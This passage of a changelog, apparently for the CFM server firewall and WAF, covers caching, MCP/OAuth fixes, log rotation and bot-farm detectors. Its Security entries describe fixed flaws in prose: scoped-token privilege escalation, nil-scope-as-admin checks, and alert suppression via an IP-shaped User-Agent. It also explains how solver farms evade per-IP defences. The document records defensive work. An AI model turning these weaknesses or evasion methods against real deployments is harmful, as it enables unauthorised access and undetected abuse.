  rDNS is stable for months, so resolved PTRs now live in a separate long-lived
  cache while country/ASN keep refreshing daily from mmdb. Net effect: a given
  IP's reverse-DNS runs ~once a month no matter how many times it is seen, with
  no cost to geo freshness. Negative results (no PTR / DNS timeout) are not
  cached, so a transient failure isn't pinned for 30 days. In-memory only
  (rebuilds after a restart); a persistent PTR store is a possible follow-up but
  low-value now that no hot path blocks on PTR. Test: `TestLookupUsesLongLivedPTRCache`.
- **Enricher: 24h cache TTL (was 4h) + 400k-entry cap (was 200k); host/IP
  drilldown enrich no longer blocks on PTR.** PTR reverse-DNS is the expensive,
  rarely-changing field, so the longer TTL + larger LRU keep a busy node's active
  IP set resident and resolve each IP's PTR ~once a day instead of every few hours
  (~100 MB worst-case footprint). The host-analyze loop (up to 500 IPs) and the
  HostDetail/IPShort/IPLong drilldowns (which feed the MCP `host_drilldown`/
  `ip_drilldown`/traffic tools under a 60s cap) now use `LookupCachedOrAsync`:
  Country/ASN are returned inline, PTR is served from cache when warm and resolved
  in the background otherwise (so it appears on a later view rather than stalling
  the request). Per-alert display paths and the FCrDNS challenge-exclude matcher
  keep synchronous `Lookup` (PTR wanted immediately / correctness-critical).

### Fixed
- **Dropped wasteful blocking reverse-DNS from several hot/read enrich paths
  (fleet-wide latency).** Audited every `Enricher.Lookup` call (which does a PTR
  reverse-DNS, up to ~1s/IP) and switched the sites that only use Country/ASN and
  discard the PTR to the PTR-free `LookupGeoFast`: the challenge-solved and
  WAF-trigger detector hooks (per event), leniency country/ASN matching, the
  autoblock challenge enrich-suffix, the history-events API per-row enrich, and
  the traffic-rule country simulate. Additionally, WAF `top_ips` now resolves PTR
  **after** truncating to the top-N instead of for every unique IP in the window
  (behaviour-identical output, far fewer rDNS calls). Per-alert detector display
  paths that actually show PTR, and the FCrDNS challenge-exclude matcher, keep the
  full `Lookup` deliberately. No output changes.
- **WAF engine summary (`/api/v1/waf/engine/summary?enrich=1`) no longer does a
  blocking reverse-DNS per distinct IP — fixes multi-minute latency / MCP 60s
  timeouts.** The per-row enrich branch called `Enricher.Lookup` (which performs a
  PTR reverse-DNS, up to 1s per IP) for every distinct source IP in the window,
  yet only used the mmdb Country/ASN fields and discarded the PTR. On a busy node
  (hundreds of distinct IPs over 24h) this serialized into minutes, so
  `waf_activity` / `security_overview` over MCP timed out at the client's 60s cap
  while the PTR-free `cfm webtop history overview` returned in ~1.5s. Switched that
  branch to `LookupGeoFast` (mmdb Country/ASN, no PTR) — behaviour-identical for
  the country filter and enriched rows. `top_ips` still resolves PTR (bounded to
  the top-N). Affects the CLI/web UI/MCP summary alike.
- **MCP `security_overview` now runs its five sections concurrently, each under a
  timeout budget.** The composed tool used to fetch health, WAF, challenge,
  firewall and suspicious sections sequentially, so its latency was the sum and a
  single slow read (e.g. the WAF summary) could blow the MCP client's ~60s call
  timeout and sink the whole tool. Sections now run in parallel and each degrades
  to a per-section `{"error":"section timed out"}` object, so the tool returns
  bounded partial data instead of failing. Test: `TestSecurityOverviewSectionBudget`.
  (Does not by itself fix the underlying WAF-summary latency — see below/roadmap.)
- **MCP: disable the go-sdk localhost/DNS-rebinding guard so the edge-proxied
  server stops returning 403 to authenticated clients.** The go-sdk streamable
  transport rejects (403) any request whose accepted-connection LocalAddr is
  loopback but whose Host header is not — a guard for localhost-only dev servers.
  CFM's edge (OpenResty/Angie) terminates TLS and upstreams to the daemon over
  `127.0.0.1:6060` while forwarding the public Host, which tripped the guard: the
  claude.ai connector completed the full OAuth flow (register→authorize→consent→
  token, all 200/302) and then got 403 on every `/mcp` tool call. `/mcp` is gated
  by `MCP_TOKEN`/audience-bound OAuth and is not cookie/session (not CSRF-reachable),
  so the guard only broke the real topology; it is now disabled and the bearer/OAuth
  gate is the sole authority. Test: `TestMCPBehindProxyNonLoopbackHost`.
- **MCP OAuth: serve `/.well-known/openid-configuration` (OIDC discovery) as an
  alias of the RFC 8414 authorization-server metadata.** The claude.ai remote
  connector probes the OIDC discovery URL when locating the
  registration/authorize/token endpoints; CFM only served the RFC 8414 doc
  (`oauth-authorization-server`), so the OIDC probe fell through to a `401` and
  the connector aborted dynamic client registration ("Couldn't register with …
  sign-in service"). The alias returns the same OAuth metadata, letting
  registration complete. No edge-config change (the edge already proxies
  `/cfm-admin/.well-known/*` to the daemon); static-bearer clients were never
  affected. Test: `TestOAuthOIDCMetadataAlias`.

### Security
- **MCP OAuth consent POST is now rate-limited per source IP.** The consent
  submit (`/cfm-admin/mcp/oauth/authorize` POST, which validates `MCP_TOKEN`) is
  throttled to 10 attempts per 5-minute window per IP; exceeding it returns `429`
  with `Retry-After` and logs `event=mcp_oauth_consent_ratelimited`. Defence-in-
  depth against brute-forcing `MCP_TOKEN` through the form and against consent-log
  spam — the token entropy remains the primary control. A legitimate operator
  submits once, well under the burst. (Closes the last INFO item from the MCP
  security review.)
- **`/unblock` and `/search` are now admin-only (`adminOnlyHandler`).** Both
  root-level routes were registered with a bare handler, i.e. protected only by
  the mux-wide token check, which authenticates but does not separate admin from
  a scoped (per-vhost cPanel/DA) token. A scoped token could therefore call
  `POST /unblock` to remove a global nft block **and** lay down a 24h
  allow-whitelist for any IP across every enforcement plane (nft, cfm.deny, csf,
  fail2ban, imunify, OpenResty/Lua WAF), and `GET /search` to enumerate where an
  arbitrary IP is blocked host-wide (cross-tenant recon). Both are host-wide
  operations with no per-vhost meaning, so they are now gated like
  `/api/v1/firewall/block`; scoped/anonymous callers get 403. Legitimate
  consumers (the cfm-web fleet controller and the `cfm` CLI) already use the
  admin token and are unaffected; the read-only MCP server never exposed either
  route. Regression tests: `TestUnblockEndpointRequiresAdmin`,
  `TestSearchEndpointRequiresAdmin`. (`docs/endpoint_scope_inventory.md` updated;
  the stale "unblock flow … intentionally not admin-gated" note is removed.)
- **Read/write endpoints no longer treat a nil vhost scope as admin (the
  `scope == nil ⇒ full access` pattern, fleet-wide).** Following the exclude
  write-guard fix, an audit found the same misclassification across many
  scoped-allowed handlers: a scoped token with an empty vhost set (e.g. a
  DB-only viewer token) produced a `nil` scope that `vhostAllowed`,
  `parseVhostFilter`, the `*ForScope` list filters and several write guards
  (`validateScopedHTTP3Write`, `validateScopedSigIgnoreWrite`,
  `scopeAllowsVhosts`, `scopeCheckHost`, the challenge single-host handlers,
  the fleet-wide list endpoints) all read as "no restriction" — letting such a
  token toggle HTTP/3, add global ClamAV sig-ignores, manage any vhost's
  challenge/traffic rules, and read cross-tenant aggregates/lists. Fixed at a
  single choke point: `vhostScopeFromContext` now returns a non-nil **empty**
  set for a scoped-role request with no scope map, so every one of those
  consumers fails closed (empty allowlist matches no host, filters to no rows)
  while admin/loopback keep the `nil` sentinel and full access. The one direct
  `CtxScopeKey{}` reader (`deriveScopedMySQLOwners`) already fails closed via
  its own `len(scope)==0` guard and is documented as such. Not reachable via
  the real cPanel token flow (a zero-domain scoped token is never minted), so
  defence-in-depth; behaviour is unchanged for real admins and normally-scoped
  tokens. New tests: `TestVhostScopeFromContext_ScopedNilYieldsEmptyNotNil` and
  `TestReadPath_VhostlessScopedTokenFailsClosed` (http3 / clam-sigignore /
  challenge-status / exclude-list leak), both verified to fail without the fix.
- **Exclude / clam-override writes now key the admin decision on the explicit
  admin role, not on a nil vhost scope (fail-closed).** `validateScopedExcludeWrite`
  and `effectiveExcludeScope` previously treated a nil context vhost scope as
  "admin". A scoped token with no vhosts (e.g. a DB-only viewer token, whose
  `Vhosts` map is nil) also produced a nil scope, so it was misclassified as
  admin and could create global / out-of-scope WAF & challenge excludes and —
  via the shared validator — flip global ClamAV scan state. Both functions now
  key on `IsAdminRequest` (the explicit authenticated-admin role) and deny any
  non-admin caller with an empty/nil scope, matching the posture already used
  by the WAF hit-rates and scoped-MySQL handlers (audit F02). Not reachable via
  the real cPanel token flow (`mintScopedViewerToken` refuses a zero-domain
  mint and `/api/v1/auth/token` requires an admin token), but the write guard
  is now correct regardless of how such a token is issued. Regression test:
  `TestExcludeWrite_VhostlessScopedTokenIsNotAdmin`. (The broader read-path
  `scope == nil ⇒ admin` pattern in other handlers is a separate follow-up.)

### Added
- **`docs/roadmaps/challenge-engine.md` §8: "Level-2 humanity gate" design
  (docs only — nothing built).** Records the reasoning for an escalation-gated
  proof-of-humanity step against distributed solver farms that run real
  headless browsers, which PoW cannot separate from humans by construction.
  Covers a passive, NON-PII interaction-entropy signal collected during the
  existing light challenge (evidence-first, alongside `solve_ms`/`tls_fp`, never
  a gate on its own); the utilization ladder (alert attribution → aggregate
  vhost-window detector → correlation); and the two-decision gate (vhost-level
  under-attack trigger vs per-request soft-gate that decides who sees a puzzle),
  with the light challenge acting as the interaction probe. Includes the honest
  economic (not absolute) framing of a puzzle, the level-2 non-negotiables
  (operator bypass/allowlist/fail-open, accessibility, auto-exit with holddown
  honouring the manual-vs-auto challenge lifecycle), and an explicit
  evidence-first, threshold-after-burn-in sequencing.
- **`docs/waf.md`: "Upstream interception" section — traffic that never
  reaches the WAF.** Documents the silent failure mode where something ahead
  of CFM's DNAT chain diverts web traffic so it never hits openresty (no
  access log, no WAF, no challenge, site still works), with a real case
  study: on an Imunify360 host running CFM at the default priority `-99`
  (Imunify-first), WebShield's nat PREROUTING at `-100` intercepts all
  traffic sourced from its known-proxy ipset (the Cloudflare ranges), so
  every Cloudflare-fronted vhost vanished from the edge log while direct
  traffic was logged normally. Includes a step-by-step diagnosis recipe
  (prerouting hook enumeration, nat counters, ipset checks, `ss -tnp`
  process verdict), the remedies (`cfm dnat on --priority -101` CFM-first
  mode vs accepting Imunify-first vs disabling WebShield), and the correct
  way to implement "never block Cloudflare" (CDN ranges in
  `cfm.ignore`/`cfm.allow` + realip from `CF-Connecting-IP` — never
  `cfm.dnat_bypass`, never NAT/conntrack exemptions).
- **WAF excludes can be scoped to specific vhosts (`--scope` / `scope_hosts`).**
  A new host qualifier lets an operator pin a WAF exclude to one or more vhosts
  — the third axis alongside type/value and rule IDs — so the exact
  intersection "rule N, on path P, for vhost H" is now expressible (e.g.
  suppress rule 402 on `/wp-admin/admin-ajax.php` for one migrating site
  only, instead of fleet-wide for that path). Available on the CLI
  (`cfm webtop waf exclude add … --scope <host>`), the API (`scope_hosts`
  query param on `waf/exclude/add|remove`), and the cfm-admin WAF excludes
  card (a "scope host" field + a Scope column). **Security:** the qualifier
  is admin-only in effect and can only *narrow* — a scoped (cPanel) token is
  always pinned to its own context vhost set server-side (`effectiveExcludeScope`
  ignores a scoped caller's `scope_hosts`), so it can never widen or redirect
  an exclude to another tenant's vhost. Regression-tested in
  `step3_scope_test.go` (admin narrows; scoped token cannot widen).
- **cfm-admin WAF excludes card now supports rule-scoped entries.** The
  "Dynamic excludes (Challenge / WAF)" panel gained an optional **rule IDs**
  field (e.g. `402` or `401,431-436`) and a **Rules** column. Previously the
  UI could only create *whole-WAF* excludes (disable the entire WAF for a
  host/path — the "way too broad" option); it can now create the same
  rule-scoped excludes the CLI/API already supported (`--rule`), so an
  operator can suppress just rule 402 on `/wp-admin/admin-ajax.php` from the
  UI instead of turning the WAF off. Empty field keeps the legacy whole-WAF
  behaviour; removal echoes the row's exact rule-id set so rule-scoped entries
  delete correctly. WAF-only (challenge excludes have no per-rule scoping).

### Changed
- **Documented WAF FP case 6: WP migration-plugin imports vs the upload
  scanners** (docs only — no rule or code change). A Website Migration
  WordPress import (`admin-ajax.php?action=WMW_import`, chunked multipart
  carrying raw PHP source — a WP backup *is* PHP) trips rule 402
  `WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG` at block tier, and because the family is
  autoblock-armed can nft-ban the admin mid-migration; a large backup will
  also often trip `php_wrappers` (305, armed, runs before 402), `sqli` (301),
  and `php_object_injection` (329). The documented remedy is a **temporary,
  operator-applied, rule-scoped exclude** for the duration of the import
  (`cfm webtop waf exclude add /wp-admin/admin-ajax.php --type path --rule 402
  [--rule 305 --rule 301 --rule 329]`, removed afterwards). An automatic
  `action`-keyed code exemption was prototyped and **reverted after
  adversarial review**: admin-ajax dispatches on `$_REQUEST['action']` (a body
  field overrides the query, so any edge matcher must out-parse PHP's
  `parse_str`/rfc1867 — a review found four confirmed bypasses), and the 32 KB
  body-scan window cannot see an `action` hidden past it in a large chunk, so
  no request-time keying is both safe and useful. See `docs/waf.md` FP case 6.

### Security
- **A host-scoped alert can no longer be silenced by the client it reports on.**
  The section sink resolves an alert's source IP by falling back to scanning the
  alert's samples for anything IP-shaped — safe while every detector keyed its
  alerts on an IP, but the new `challenge_solver_farm` finding is keyed on a
  vhost and quotes the User-Agents it observed. A client could therefore put
  `10.0.0.1` (or `127.0.0.1`) in its User-Agent, have the sink adopt it as the
  alert's source, and hit the global ignore list — which returns before any
  notification and, with the shipped `LOG_IGNORED = no`, without a log line
  either. One header would have suppressed the detector built to catch that
  client. The same fallback mis-attributed alerts by accident: an ordinary
  `Chrome/118.0.0.0` is IP-shaped, so it was reported as the source address and
  enriched with that unrelated network's ASN/geo.

  Detectors can now declare `Extra[core.ExtraIPScope] = core.IPScopeHost` when
  their `Key` is not an address; the sink's guesswork fallback stands down for
  those, while a detector-supplied `Extra["ip"]` still wins. Only
  `challenge_solver_farm` sets it — IP-keyed detectors (`waf_security`,
  `api_abuse`, …) resolve authoritatively from `Extra["ip"]` or `Key` and are
  unaffected.

### Fixed
- **The suspicious-vhost auto cool-down no longer silently shortens (and then
  drops) an operator manual vhost challenge.** Two cooperating defects in the
  challenge tick loop: (a) when the auto scorer cooled below `score_off` it
  called `ClearVhost` unconditionally, deleting the bridge entry even when a
  manual challenge (e.g. `24h` from the CLI) was active on that host; (b) the
  same-tick manual re-push used a hardcoded 60-minute TTL, so the recreated
  entry carried 1h instead of the operator's remaining window — observable in
  the logs as `vhost_clear` + `vhost_challenge ttl=1h0m0s reason=manual` in
  the same second — and once the (now-challenged) abuse traffic stopped and
  the vhost fell out of the tick's candidate set, nothing refreshed the 1h
  entry: it expired and the janitor pruned it silently, ending a 24h manual
  challenge ~19h early. Now the auto cool-down keeps the bridge entry when a
  manual challenge covers the host (logging `auto_off_keep_manual` instead),
  and the manual re-push always sends the remaining manual window. Both
  decisions use the new `manualChallengeCovering`, which also honours the
  bridge's apex→www expansion (a manual challenge on `example.com` covers
  `www.example.com`, matching `vhostVariantsForBridge`; not the reverse) so
  the www variant is protected and refreshed too. The auto cool-down clear
  guard additionally uses `manualChallengeCoversClear`, which checks **every**
  bridge variant the clear would delete — because `ClearVhost` expands apex→www
  and deletes both, an apex auto cool-down would otherwise still tear down a
  manual challenge placed on the `www` host alone. Tests:
  `TestManualChallengeCovering`, `TestManualChallengeCoversClear`.
- **`challenge_cookie_discard` no longer counts an apex↔www canonical redirect
  as two solves.** Almost every site 301s `example.gr` to `www.example.gr` (or
  the reverse) from the origin, and CFM sits in front of it. A real visitor who
  lands on the non-canonical host solves the challenge there, is redirected to
  the sibling — a different host, so a different host-only clearance cookie — and
  is challenged again: two genuine solves, seconds apart, for one gate. On a
  force-challenge endpoint under bot-registration attack this is routine, and
  behind a CGNAT/residential address carrying several real visitors the doubled
  count crossed `MIN_SOLVES` and got the shared address flagged (and, with
  enforcement on, banned — taking real subscribers with it). The detector now
  scores the busier host spelling per `(apex-normalised host, path)` instead of
  their sum, so one visitor's apex-then-www journey counts once while a
  cookie-less pipeline that re-solves the same gate still counts every pass. The
  collapse can only ever lower a count, so it never creates a new finding; the
  alert reports both the collapsed and raw totals (`raw_solves`). Nothing touches
  the edge, Lua, or the clearance cookie.
- **TLS fingerprint: a long cipher list was cut mid-cipher-name.** The edge
  stamper bounded each field at 512 bytes and cut blindly, so a client offering
  the full OpenSSL suite list ended its cipher field on a partial name
  (`...:ECDHE-RSA-AES256-S` — observed in production from Meta's crawler). A
  partial name reads as a cipher that exists in no ClientHello. Fields now bound
  at 1024 bytes (2048 total), the cut lands on a `:` boundary, and a cut field
  ends in a `TRUNC` token that stays in the hashed value — so a truncated list
  can never hash equal to a client that genuinely offered that shorter prefix.
  The `first_seen` log line gained `trunc=`, because a truncated fingerprint can
  be shared by two clients whose offers agree up to the bound and must not be
  counted as one. The two list fields are now budgeted against the total bound
  and cut individually, never by cutting the joined tuple: 200 unknown cipher
  suites plus 200 unknown groups — all client-chosen — produced a value carrying
  three field separators instead of six, so ALPN, the HTTP version and the
  resumption flag vanished and the tuple read as "a client that offered no
  ALPN", with the `TRUNC` marker itself cut in half so `trunc=` reported false.
  If the total is ever exceeded anyway the edge now stamps no header at all,
  since no fingerprint is honest where a mutilated one is not.
- **OpenResty edge logs now actually rotate.** On a busy OpenResty host
  `/usr/local/openresty/nginx/logs/access.log` had reached 235 GB (249 GB in
  that directory) with no rotated generations. Three causes, all fixed:

  - `/etc/logrotate.d/logrotate-cfm` was installed **only** by
    `scripts/install-{openresty,angie}.sh`, which an operator runs once by
    hand. A host that had only ever been package-upgraded had no CFM rotation
    at all — not for the edge logs, not for `/var/log/cfm/`. The package
    postinst now deploys it too (`deploy_logrotate_config` in
    `scripts/package-proxy-config-deploy.sh`), so an upgrade fixes the host.
    It force-refreshes on every upgrade, following the same hash-stamp policy
    the postinst already uses for the Lua runtime: untouched files are updated
    silently, a locally modified one is backed up to
    `/var/lib/cfm/backups/logrotate-cfm.local-prepkg.<ts>` with a `WARNING`
    before being refreshed. A future rotation fix therefore reaches the fleet
    without anyone re-running an installer, and without eating operator edits.
  - The config listed filenames, and the list had drifted:
    `access.bad_request.log` (1.1 GB on that host), `cfm.clam.log`,
    `cfm.socket.log`, `cfm.mysql.log`, `cfm.lsm.log`, `ua_emergency.log`,
    `challenge.access.log` and `/var/log/cfm.smtp.log` were all unrotated. It
    now globs `*.log` per CFM-owned directory, so new log files are covered on
    the day they appear.
  - `daily` was the only trigger. An edge writing tens of GB/day grows
    unbounded until the nightly run, and past a certain size `copytruncate` +
    `compress` no longer fits in free space — after which the file can never
    rotate again. The blocks now carry `maxsize` caps (200M for `/var/log/cfm/`,
    2G for the edge), and `/etc/cron.hourly/cfm-logrotate` gives those caps an
    hourly chance to fire instead of a daily one. The edge block also drops
    `delaycompress`, which was keeping a full-size uncompressed `.1` alongside
    the live file.

  Recovering an already-full host: truncate in place (`: > access.log`), never
  `rm` — see `docs/log-rotation.md`.
- **Vendor-rotated paths removed from the CFM logrotate config.**
  `/var/log/angie/access-panel.log` and `/var/log/nginx/access_cfm_combined.log`
  were declared by CFM *and* by the angie/nginx packages' own
  `/etc/logrotate.d/*` globs. logrotate treats a second declaration of a path as
  a config error (`duplicate log entry`) and aborts the run rather than rotating
  it, so those entries removed rotation instead of adding it. CFM now covers only
  the two directories nobody else owns (`/var/log/cfm/`,
  `/usr/local/openresty/nginx/logs/`); `--host` mode of the new checker verifies
  the vendor-owned ones on a live server. Relatedly, the deploy path no longer
  leaves `/etc/logrotate.d/logrotate-cfm.bak` behind (read as a duplicate config
  by older logrotate builds) and removes any left by earlier installers — the
  previous config is kept under `/var/lib/cfm/backups/` instead.

### Added
- **`farm` badge for `challenge_solver_farm` in the WebUI and the TUI.** A blue
  pill in *WebTop* → Flags and in *Suspicious + challenged vhosts* → Status, and
  an `F` in the leading slot of the TUI's `SUP` column. Until now the detector's
  only output was an email and a `cfm.detector.log` line, so nothing on the
  dashboard said which vhost was being farmed.

  It is **not** driven by the alert, and that is the point: `COOLDOWN`
  rate-limits alerts to one per 30 minutes because a farm runs for hours, so a
  badge fed by alerts would blink off mid-attack. The detector marks the vhost on
  every over-threshold evaluation — before the cooldown is consulted — with a TTL
  of `max(3 × EVERY, WINDOW)`, so the badge means "farmed right now" and clears
  itself within one TTL of the farm stopping. There is no un-mark path, so a
  missed callback cannot leave a vhost badged forever, and the marks are dropped
  when the detectors manager stops so a reload cannot leave stale ones behind.

  `solver_farm` is now on the `top-short`, `suspicious`, `long-top`,
  `challenge/vhosts` and `challenge/vhost/status` responses — the last so scoped
  tokens, which reach the vhost list only through it, get the badge too. The new
  `pill info` style is for observations rather than enforcement state: `warn` and
  `danger` already mean "scored suspicious" and "challenge is on", and this
  detector never enforces anything. The badge is also orthogonal to the score
  beside it, since a farm solves the challenge correctly and need not look
  suspicious at all.
- **TLS fingerprint on every challenge solve, log-first.** Every other signal on
  a solve is written by the client — the User-Agent, the cookies, the PoW
  solution, the timing. The TLS handshake is written by its TLS stack before a
  byte of HTTP is sent, so a client claiming `Chrome/118` whose handshake does
  not look like Chrome's is lying in a way no header edit can fix. The observed
  farm sends one exact User-Agent for 100% of its solves, so this holds even if
  it randomises that tomorrow.

  `configs/lua/cfm_tlsfp.lua` stamps `X-CFM-TLS` on the request the edge
  forwards to `/__cfm_verify` (protocol, offered ciphers, offered curves, ALPN,
  HTTP version, resumption flag); `internal/tlsfp` parses it into an
  8-character id. It is a poor-man's JA3, not a JA4 — the edge cannot report the
  extension list or its order without a module — but it needs no module, patch
  or rebuild, which is why it goes first.

  GREASE code points are stripped before hashing. RFC 8701 stacks insert one
  chosen at random *per connection* into the cipher list and the
  supported_groups, and nginx renders them as hex — left in, one real Chrome
  would produce up to 16×16 distinct ids and the dictionary would fill with
  noise. `Raw` stays verbatim as the evidence and the offered order is preserved;
  `grease=true|false` on the first_seen line records whether GREASE survives
  OpenSSL's ClientHello parsing on this edge at all.

  Lands as `tls_fp=<id>` on every `result=solved` line in `cfm.challenges.log`,
  `payload.tls_fp` on the `challenge_solved` history event, and one
  `tls_fp=<id> first_seen grease=… ua=… tls=…` dictionary line per distinct
  fingerprint,
  so `grep tls_fp=<id>` finds the definition and every solve that used it. `-`
  means the edge supplied none (older edge config, plain HTTP, legacy DNAT), not
  a parse failure.

  **Nothing decides on it.** The fingerprint↔UA mapping has to be derived from
  captured traffic rather than written from memory — the cipher names come from
  the edge's OpenSSL build, so a table from another fleet is not comparable.
  Reading it, the edge tolerates an older nginx without `$ssl_curves` or
  `$ssl_alpn_protocol` (missing variables degrade to empty fields instead of
  refusing to start), always clears a client-supplied `X-CFM-TLS` before setting
  its own, and restricts the value to a charset that cannot carry CR/LF or the
  field separator into a log line. See `docs/roadmaps/challenge-engine.md` §6.
- **`uaplausible` gains three Chrome version-shape rules**
  (`chrome_impossible_patch`, `chrome_nonzero_minor`,
  `chrome_reduced_build_with_patch`). The farm does not reuse one forged
  User-Agent — it *generates* them: in the production capture, Chrome majors
  39–60 carry 110–170 distinct build numbers each, drawn roughly uniformly from
  `810..9996`, while every other major has at most 8 sitting tightly on the real
  release build. That is 3,128 of 4,151 distinct Chrome version strings from one
  generator, over just four device templates.

  The rules need no table of Chrome release builds — writing one from memory is
  what this package's doc comment forbids, and it would need maintaining forever.
  Each states a property of Chrome's own version scheme that holds across the
  corpus, majors 15 → 150: the 4th component is ≥ 1000 (the highest
  non-generated patch observed is 280, with outliers to 819; the generator draws
  1000–1999), the 2nd component is non-zero (4,149 of 4,151 strings have it at
  0), or the build is 0 while the patch is not (a reduced UA freezes the last
  three components together).

  With these, the package flags 64.5% of the distinct UA strings but only 2.22%
  of the requests — the gap is the finding, since a generator minting a fresh
  string per request dominates the vocabulary without moving the traffic share.
  No known crawler or Chromium derivative is caught. The verdict reaches
  `ua_impossible=` in `cfm.challenges.log`, the `challenge_solved` history event,
  the forensics `impossible` pill, and the `impossible_ua` count on
  `challenge_solver_farm` alerts, exactly as the existing rules do.
- **New detector `challenge_cookie_discard`** — clients that re-solve the
  challenge while still holding valid clearance. Solving mints a signed
  `cfm_clearance` cookie good for `CHALLENGE_COOKIE_LIFE` (45m by default), so a
  browser solves once and is done. An address that solves again minutes later
  never stored the cookie: a request pipeline with no cookie jar, driving a
  headless browser per request. Worst offender in the production capture: 138
  solves in 10 minutes, 1,121 across the day, one User-Agent, two vhosts.

  It is the mirror image of `challenge_solver_farm` and its exact blind spot —
  that one keys on a vhost because a farm burns a fresh address per solve, this
  one keys on the address, for the population that does the opposite. Neither
  sees the other's traffic.

  Calibrated on the same 23h capture (111,537 solves, 97,556 distinct addresses)
  replayed through a sliding 10-minute window: 99.6% of addresses never solved
  twice in any window, 248 reached 3+ (244 of them carrying one identical
  desktop Chrome UA), the plausibly-legitimate repeaters topped out at 4, and no
  address in the capture peaked at exactly 5. `MIN_SOLVES` defaults to 8 — a 2x
  margin over the busiest legitimate repeater, still flagging 219 of the 248 —
  because a user who opens several tabs at once is challenged in each before any
  cookie is set, and that small burst must stay under the line.

  Unlike `challenge_solver_farm`, blocking here is coherent: the subject is one
  real address abusing the challenge right now, and the alert sets `Extra["ip"]`
  authoritatively so the sink never falls back to scanning samples that quote
  User-Agents and URIs. It still ships **alert-only** — `BLOCK = "dryrun"` to
  watch the blocking path without touching nftables, then `BLOCK = "6h"` in
  `[challenge_cookie_discard]` once you trust it (soft TTL rather than
  `permanent`, because every address observed was a residential proxy exit).
  Add the section to `/etc/cfm/detectors.conf` to enable it; greppable as
  `Challenge/CookieDiscard`.
- **`scripts/tests/check_logrotate_coverage.sh`, wired into CI.** Cross-checks
  every log path CFM configures — edge `access_log`/`error_log`, Apache
  `CustomLog`, `*_LOG_FILE` keys in `cfm.conf`, the systemd stdout/stderr
  capture, the rsyslog LSM sink, and `/var/log/cfm/…` literals in Go — against
  `configs/logrotate-cfm`, and fails if one is neither covered by CFM nor in a
  directory documented as vendor-rotated. It also fails if CFM declares a
  vendor-globbed path, which is what makes the duplicate-entry class of bug
  impossible to reintroduce. Paths are collected regardless of extension: a
  future log named something other than `*.log` would be missed by both the
  globs and an extension-filtered check, so the check does not filter. `--host` runs the same audit against a live
  server's `/etc/logrotate.d`, printing each log's size and the config that
  rotates it. New doc: `docs/log-rotation.md`.
- **`challenge_solver_farm` gains an `ACTION` knob.** `observe` (the default, and
  what an existing config without the key gets) notifies and logs; `logonly`
  keeps the `cfm.detector.log` record but sends no notification, for a vhost
  already triaged and accepted as farmed. `deny` and `block` are defined and
  recognised but refuse to activate, falling back to `observe` with a logged
  reason — the vocabulary is fixed now so `detectors.conf`, a packaged conffile,
  does not have to grow its accepted values later.

  They are reserved rather than merely unwritten. `block` does not work on this
  traffic shape: at 1.07 solves per address the address is gone before the alert
  fires, and the pool is residential, so the ban lands on a real visitor. `deny`
  has no safe subject — a vhost-wide 403 takes the customer's site down, and the
  narrow form is a UA-cluster traffic rule that a farm evades by randomising one
  header. Detectors can now also set `core.ExtraNotify` to ask the sink for the
  log record without the mail; absent means notify, so nothing else changes.
- **`docs/roadmaps/challenge-engine.md`.** Records the measurements behind the
  challenge-engine decisions so they are not re-derived or, worse, contradicted
  from intuition: why raising `defaultPowDifficulty` is a trap until the browser
  solver is rewritten (the shipped solver runs at 48.8 kH/s against 4.49 MH/s
  for naive native code — a ~92x handicap that raising difficulty does not
  change), why memory-hard PoW was rejected (verification cost becomes an
  amplification DoS, and it defends against GPU solvers while the observed farms
  run real browsers), what per-vhost difficulty needs, and the `solve_ms`
  baseline that says whether any of it is urgent.
- **Forensics history surfaces the new solve signals.** The WebUI table gains a
  **Solve** column showing the real client-side solve latency (`892ms`, `1.4s`,
  and `-` when unknown or not applicable — never a misleading `0`), an
  `impossible` pill beside a self-contradictory User-Agent with the matched rules
  in its tooltip, and an **impossible UA only** filter. The tooltip also now
  lists the PoW difficulty and distinguishes the real solve latency from the
  legacy server-side verify time. Without this the two new fields were persisted
  but invisible in the page whose empty UA column motivated the work.

### Fixed
- **Challenge-solve subscribers no longer leak across config reloads.** Detector
  factories re-run on every reload — and the config signature folds in each
  tailed log's inode, so a nightly logrotate forces one. Each run registered
  another challenge-solve callback with no way to remove it, so the closures
  belonging to retired detectors kept enqueueing into buffers nothing drained any
  more. On the ~100k-solves/day stream this change introduces, that grows
  without bound with reload count. `stopAll` now clears the subscriber list, the
  new instance re-subscribes as it is built, and the detector's own ingest buffer
  is bounded with a logged overflow count.

### Added
- **User-Agent plausibility check (`internal/uaplausible`).** Flags a UA that
  contradicts *itself* — an iPhone carrying the Blink `AppleWebKit/537.36` token,
  a `Chrome/` token on iOS where only `CriOS` exists, a Firefox carrying Blink's
  WebKit build, a Chrome UA missing `KHTML, like Gecko` or with a hand-truncated
  version, two platform tokens at once. Recorded on every challenge solve
  (`ua_impossible=` in `cfm.challenges.log`, `payload.ua_impossible` in history)
  and reported as corroborating evidence on `challenge_solver_farm` alerts.

  It answers "is this UA a lie", **not** "is this UA old": a stale-but-coherent
  UA belongs to a real person on an old browser. Every rule was derived from and
  validated against a 314,877-request production capture (4,889 distinct UA
  strings); together they flag 0.55% of it, and every flagged string was
  inspected. An earlier draft of the `KHTML` rule matched the literal
  `(KHTML, like Gecko)` and wrongly flagged legitimate crawlers — Amazonbot,
  YouBot, GeedoShopProductFinder — which append their own identity inside the
  same parentheses; those three are now regression cases.

  Deliberately **not** included: version-staleness scoring. On the same capture,
  Chrome 118 was 72.5% of all Chrome requests *because a solver farm dominated
  the traffic* — so calibrating "current" by request volume would let an attacker
  define normal, and any other calibration still only measures age, which
  legitimate old browsers share.
- **`challenge_solver_farm` detector — spots distributed challenge-solving
  botnets. Alert-only.** Bots now complete the whole cookie + JS + PoW flow
  correctly, and defeat every per-IP threshold *by construction*: they solve once
  per address from a large residential-proxy pool. Measured on a production edge
  over 23h, one farm produced **101,880 solves on a single vhost from 95,281
  distinct IPs — 1.07 solves per IP — across 77,792 distinct `/24`s**. No per-IP
  counter can fire on that; the population is only visible in aggregate.

  The detector keys on the **vhost** and counts distinct client subnets solving
  it within `WINDOW`. Thresholds were derived by replaying that capture through
  the detector at its original timestamps, so they describe what the code
  measures — a **sliding** window sampled every `EVERY`, not disjoint one-minute
  buckets (the sliding maximum is always ≥ the bucket maximum, so bucket figures
  would overstate the headroom). The farm ran at a median of 73 subnets per
  window (p01 49, max 122) against a maximum of 27 for every other vhost, so the
  default `MIN_SUBNETS = 40` flags 2758 of 2761 farm evaluations and 0 of 3212
  legitimate ones. Replaying the full 111,537-solve log flags exactly one vhost
